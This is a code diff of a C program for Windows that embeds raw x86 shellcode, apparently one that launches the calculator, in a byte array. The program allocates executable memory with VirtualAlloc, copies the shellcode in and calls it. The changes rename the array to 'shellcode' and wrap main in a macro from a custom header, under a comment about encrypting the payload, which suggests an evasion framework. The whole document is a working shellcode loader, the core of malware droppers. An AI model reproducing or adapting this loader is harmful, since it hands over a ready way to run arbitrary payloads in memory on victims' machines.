@@ -1,8 +1,11 @@
+#include "clientHeader.h"
 #include <windows.h>
 #include <stdio.h>
 
-// calc 
-unsigned char buf[] =                                                                
+// Encrypt in Payload
+PL_int main(){
+    // calc
+    unsigned char shellcode[] =                                                                
 "\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
 "\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
 "\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
@@ -16,12 +19,11 @@ unsigned char buf[] =
 "\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
 "\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
 "\x52\xff\xd0";
-
-int main(){
-    LPVOID p = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    
+    LPVOID p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
     if (p == NULL)
         return 1;
-    memcpy(p, buf, sizeof(buf));
+    memcpy(p, shellcode, sizeof(shellcode));
     ((void(*)())p)();
     return 0;
 }
